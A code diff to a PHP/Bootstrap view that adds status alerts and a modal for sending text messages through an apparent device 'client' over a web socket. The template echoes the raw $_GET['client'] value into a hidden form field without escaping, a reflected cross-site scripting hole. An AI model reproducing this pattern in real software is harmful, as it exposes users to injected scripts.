@@ -2,9 +2,21 @@
 
 <div class="container">
     <div class="row">
+        <?php if (isset($_GET['alert'])): ?>
+            <?php if ($_GET['alert'] == 1): ?>
+                <div class="alert alert-success" id="error-alert" role="alert">
+                    <strong> Text message request sent </strong>
+                </div>
+            <?php else: ?>
+                <div class="alert alert-danger" id="error-alert" role="alert">
+                    <strong> Text message request failed </strong>
+                </div>
+            <?php endif ?>
+        <?php endif ?>
         <div class="col-md-12 page-header d-flex justify-content-between align-items-center">
             <h2 class="page-title"><?= $device ?> Messages</h2>
-            <button class="btn btn-dark" data-toggle="modal" data-target="#smsModal"><i class="fas fa-plus"></i></button>
+            <!-- <button class="btn btn-dark" data-toggle="modal" data-target="#smsModal"><i class="fas fa-plus"></i></button> -->
+            <button type="button" class="btn btn-dark" data-toggle="modal" data-target="#exampleModal" data-whatever="@getbootstrap"><i class="fas fa-plus"></i></button>
         </div>
     </div>
     <br>
@@ -45,34 +57,38 @@
     </div>
 </div>
 
-<div class="modal fade" id="smsModal" tabindex="-1" role="dialog" aria-labelledby="smsModal" aria-hidden="true">
-    <div class="modal-dialog" role="document">
-      <div class="modal-content">
-        <div class="modal-header">
-          <h5 class="sms-modal-title" id="smsModalLabel">SMS</h5>
-          <button type="button" id="sms-modal-dismiss" class="close" data-dismiss="modal" aria-label="Close">
-            <span aria-hidden="true">&times;</span>
-          </button>
-        </div>
-        <div class="modal-body">
-          <form action="/send" method="post">
-            <div class="content">
-                <textarea style="resize: none;" name="message" id="" cols="30" rows="5" class="form-control" placeholder="Message..."></textarea>
-                <br>
-                <input type="hidden" name="client" value="">
-                <input type="hidden" name="cmd" value="text">
-                <div class="input-group mb-3">
-                <input type="tel" name="" class="form-control" placeholder="Phone number" aria-label="Phone number" aria-describedby="basic-addon2">
-                <div class="input-group-append">
-                    <button style="background: #2196F3 !important;color: white" type="submit" class="btn" id="modal-save">Send</button>      
-                </div>
-                </div>
-                <button style="background: #2196F3 !important;color: white" type="button" class="btn col-12" id="modal-save"><i class="fas fa-download"></i>  Download Messages</button>
+<div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content">
+        <form method="post" action="/send">
+            <div class="modal-header">
+                <h5 class="modal-title" id="exampleModalLabel">Send text message</h5>
+                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                    <span aria-hidden="true">&times;</span>
+                </button>
             </div>
-          </form>
-        </div>
-      </div>
+            <div class="modal-body">
+                <div class="form-group">
+                    <label for="recipient-name" class="col-form-label">Recipient:</label>
+                    <input name="sender" type="tel" class="form-control" id="recipient-name">
+                </div>
+                <div class="form-group">
+                    <label for="message-text" class="col-form-label">Message:</label>
+                    <textarea name="content" class="form-control" id="message-text"></textarea>
+                </div>
+            </div>
+            <input type="hidden" name="web_socket_id" value="<?= $webSocketID ?>">
+            <input type="hidden" name="cmd" value="MESSAGE">
+            <input type="hidden" name="type" value="server">
+            <input type="hidden" name="referrer" value="messages">
+            <input type="hidden" name="client" value="<?= $_GET['client'] ?>">
+            <div class="modal-footer">
+                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+                <button type="button" class="btn btn-primary">Send message</button>
+            </div>
+      </form>
     </div>
+  </div>
 </div>
 
 <?php require_once __DIR__ . "/../footer.php"; ?>
